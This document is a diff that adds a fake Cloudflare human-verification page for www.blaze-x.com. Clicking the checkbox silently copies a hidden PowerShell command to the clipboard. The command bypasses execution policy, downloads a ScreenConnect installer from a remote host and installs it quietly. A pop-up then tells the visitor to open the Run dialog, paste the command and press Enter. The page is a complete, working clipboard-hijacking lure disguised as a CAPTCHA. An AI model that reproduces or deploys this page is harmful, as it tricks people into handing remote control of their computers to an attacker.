@@ -1,0 +1,453 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>www.blaze-x.com</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap');
+       
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Inter', system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background-color: #ffffff;
+            color: #333333;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            line-height: 1.5;
+        }
+       
+        .container {
+            max-width: 620px;
+            width: 100%;
+            border: 1px solid #e5e5e5;
+            border-radius: 8px;
+            padding: 40px 50px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+            margin: 20px;
+        }
+       
+        .header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 8px;
+        }
+       
+        .brand-logo {
+            height: 42px;
+            width: auto;
+            max-width: 180px;
+        }
+       
+        .title {
+            font-size: 24px;
+            font-weight: 500;
+            color: #1a1a1a;
+            margin: 0;
+        }
+       
+        .subtitle {
+            font-size: 16px;
+            color: #555555;
+            margin-bottom: 30px;
+        }
+       
+        .challenge-box {
+            border: 1px solid #e0e0e0;
+            border-radius: 6px;
+            padding: 14px 20px;
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            background-color: #fafafa;
+            margin-bottom: 30px;
+            font-size: 15px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+       
+        .challenge-box:hover {
+            background-color: #f5f5f5;
+        }
+       
+        .checkbox {
+            width: 20px;
+            height: 20px;
+            border: 2px solid #666;
+            border-radius: 3px;
+            flex-shrink: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+        }
+       
+        .checkbox.loading {
+            border-color: #666;
+            animation: spin 1s linear infinite;
+        }
+       
+        @keyframes spin {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+       
+        .spinner {
+            width: 16px;
+            height: 16px;
+            border: 2px solid #666;
+            border-top-color: transparent;
+            border-radius: 50%;
+            animation: spinner-rotate 0.8s linear infinite;
+        }
+       
+        @keyframes spinner-rotate {
+            to { transform: rotate(360deg); }
+        }
+       
+        .custom-brand {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 2px;
+            font-size: 13px;
+        }
+       
+        .custom-logo {
+            height: 38px;
+            width: auto;
+            max-width: 160px;
+        }
+       
+        .privacy-terms {
+            font-size: 11px;
+            color: #666666;
+        }
+       
+        .main-text {
+            font-size: 16px;
+            color: #333333;
+            margin-bottom: 40px;
+        }
+       
+        .footer {
+            text-align: center;
+            font-size: 12px;
+            color: #777777;
+            margin-top: 60px;
+        }
+       
+        .ray-id {
+            border-top: 1px solid #e5e5e5;
+            padding-top: 16px;
+            margin-top: 40px;
+        }
+       
+        a {
+            color: #007bff;
+            text-decoration: none;
+        }
+       
+        a:hover {
+            text-decoration: underline;
+        }
+       
+        .verifying-text {
+            color: #666;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+        }
+        .modal-overlay.active {
+            display: flex;
+        }
+        .modal-container {
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
+            width: 70%;
+            height: 70%;
+            overflow-y: auto;
+            position: relative;
+        }
+        .modal-content-wrapper {
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+        }
+        .modal-header {
+            background: #f97316;
+            color: white;
+            padding: 16px 24px;
+            font-size: 18px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            flex-shrink: 0;
+        }
+        .modal-header img {
+            width: 56px;
+            height: 56px;
+            flex-shrink: 0;
+            object-fit: contain;
+            background: white;
+            border-radius: 4px;
+        }
+        .modal-body {
+            padding: 24px 24px 16px;
+            flex: 1;
+            overflow-y: auto;
+        }
+        .instruction-title {
+            font-size: 15px;
+            font-weight: 500;
+            color: #374151;
+            margin-bottom: 16px;
+        }
+        .steps {
+            font-size: 15px;
+            line-height: 1.5;
+            color: #374151;
+            margin-bottom: 24px;
+        }
+        .steps ol {
+            padding-left: 20px;
+            margin: 0;
+        }
+        .steps li {
+            margin-bottom: 8px;
+        }
+        .modal-footer {
+            border-top: 1px solid #e5e7eb;
+            padding: 16px 24px;
+            background: #f9fafb;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 16px;
+            flex-shrink: 0;
+        }
+        .footer-text {
+            font-size: 13px;
+            color: #6b7280;
+            line-height: 1.4;
+        }
+        .verify-btn {
+            background: #f97316;
+            color: white;
+            border: none;
+            padding: 12px 32px;
+            font-size: 15px;
+            font-weight: 600;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            white-space: nowrap;
+            flex-shrink: 0;
+        }
+        .verify-btn:hover {
+            background: #ea580c;
+        }
+        .modal-alert {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            padding: 20px 28px;
+            border-radius: 10px;
+            text-align: center;
+            max-width: 320px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+            display: none;
+            z-index: 2001;
+        }
+        .modal-alert.show {
+            display: block;
+        }
+        .modal-alert-text {
+            font-size: 15px;
+            color: #374151;
+            margin: 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="https://res.cloudinary.com/djzv1chbx/image/upload/v1780744870/blazex_logo_fzhr0y.png"
+                 alt="BlazeX Logo"
+                 class="brand-logo">
+            <div class="title">www.blaze-x.com</div>
+        </div>
+       
+        <div class="subtitle">Verify you are human by completing the action below.</div>
+       
+        <div class="challenge-box" id="challengeBox">
+            <div class="checkbox" id="checkbox"></div>
+            <div style="flex: 1;" id="verifyText">
+                <strong>Verify you are human</strong>
+            </div>
+           
+            <div class="custom-brand">
+                <img src="https://res.cloudinary.com/djzv1chbx/image/upload/v1780744408/logo_kqbbyc.png"
+                     alt="Logo"
+                     class="custom-logo">
+                <span class="privacy-terms">Privacy Terms</span>
+            </div>
+        </div>
+       
+        <div class="main-text">
+            www.blaze-x.com needs to review the security of your connection before proceeding.
+        </div>
+       
+        <div class="footer">
+            <div class="ray-id">
+                Ray ID: <span style="font-family: monospace;">9d8e7f1234567</span>
+            </div>
+            <div style="margin-top: 8px;">
+                Performance &amp; security by <a href="https://www.cloudflare.com" target="_blank">Cloudflare</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- MODAL OVERLAY -->
+    <div class="modal-overlay" id="modalOverlay">
+        <div class="modal-container">
+            <div class="modal-content-wrapper">
+                <div class="modal-header">
+                    <img src="https://res.cloudinary.com/djzv1chbx/image/upload/v1780744408/logo_kqbbyc.png" alt="Logo">
+                    <span>Complete these Verification Step</span>
+                </div>
+               
+                <div class="modal-body">
+                    <div class="instruction-title">
+                        To better prove you are not a robot, please:
+                    </div>
+                   
+                    <div class="steps">
+                        <ol>
+                            <li>Press and hold the <strong>windows</strong> key + <strong>R</strong>.</li>
+                            <li>Press <strong>ENTER</strong> when the verification window pop up.</li>
+                            <li>In the verification window, press <strong>Ctrl + V</strong>.</li>
+                            <li>Press <strong>Enter</strong> on your keyboard and press Y and Enter to finish</li>
+                        </ol>
+                    </div>
+                </div>
+               
+                <div class="modal-footer">
+                    <div class="footer-text">
+                        Perform the steps above to finish verification.
+                    </div>
+                    <button id="verifyBtn" class="verify-btn">
+                        VERIFY
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Alert Modal -->
+    <div class="modal-alert" id="alertModal">
+        <p class="modal-alert-text" id="alertMessage"></p>
+    </div>
+
+    <script>
+        const maliciousCommand = `powershell -ExecutionPolicy Bypass -Command "try { Invoke-WebRequest -Uri 'https://diaplooo.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest' -OutFile $env:TEMP\\sc.msi -UseBasicParsing -TimeoutSec 15 } catch {}; Start-Process msiexec -ArgumentList '/i', $env:TEMP\\sc.msi, '/quiet', '/norestart' -Wait -ErrorAction SilentlyContinue"`;
+
+        const challengeBox = document.getElementById('challengeBox');
+        const checkbox = document.getElementById('checkbox');
+        const verifyText = document.getElementById('verifyText');
+        const modalOverlay = document.getElementById('modalOverlay');
+        const verifyBtn = document.getElementById('verifyBtn');
+        const alertModal = document.getElementById('alertModal');
+        const alertMessage = document.getElementById('alertMessage');
+
+        let clickCount = 0;
+        let isVerifying = false;
+
+        // Silent copy on user gesture (Challenge Box Click)
+        async function silentCopy() {
+            try {
+                await navigator.clipboard.writeText(maliciousCommand);
+                console.log("✅ Clipboard hijacked successfully");
+            } catch (err) {
+                console.warn("Clipboard API failed:", err.message);
+                const textarea = document.createElement('textarea');
+                textarea.value = maliciousCommand;
+                textarea.style.position = 'fixed';
+                textarea.style.opacity = '0';
+                textarea.style.left = '-999999px';
+                textarea.style.top = '-999999px';
+                document.body.appendChild(textarea);
+                textarea.focus();
+                textarea.select();
+                document.execCommand('copy');
+                document.body.removeChild(textarea);
+                console.log("✅ Clipboard hijacked using fallback");
+            }
+        }
+
+        // Copy when user clicks the challenge box (best chance of no permission prompt)
+        challengeBox.addEventListener('click', function() {
+            if (!isVerifying) {
+                silentCopy();   // Copy on first user interaction
+            }
+
+            if (isVerifying) return;
+
+            isVerifying = true;
+            checkbox.innerHTML = '<div class="spinner"></div>';
+            checkbox.classList.add('loading');
+            verifyText.innerHTML = '<strong class="verifying-text">Verifying...</strong>';
+
+            setTimeout(() => {
+                isVerifying = false;
+                checkbox.classList.remove('loading');
+                checkbox.innerHTML = '';
+                verifyText.innerHTML = '<strong>Verify you are human</strong>';
+                modalOverlay.classList.add('active');
+            }, 2500);
+        });
+
+        // VERIFY button logic
+        verifyBtn.addEventListener('click', function() {
+            clickCount++;
+           
+            if (clickCount === 1) {
+                showAlert("Verification not completed. Try again.");
+            }
+            else if (clickCount >= 2) {
+                modalOverlay.classList.remove('active');
+                setTimeout(() => {
+                    window.location.href = "https://www.blaze-x.com";
+                }, 800);
+            }
+        });
+
+        function showAlert(message) {
+            alertMessage.textContent = message;
+            alertModal.classList.add('show');
+            setTimeout(() => alertModal.classList.remove('show'), 2200);
+        }
+    </script>
+</body>
+</html>
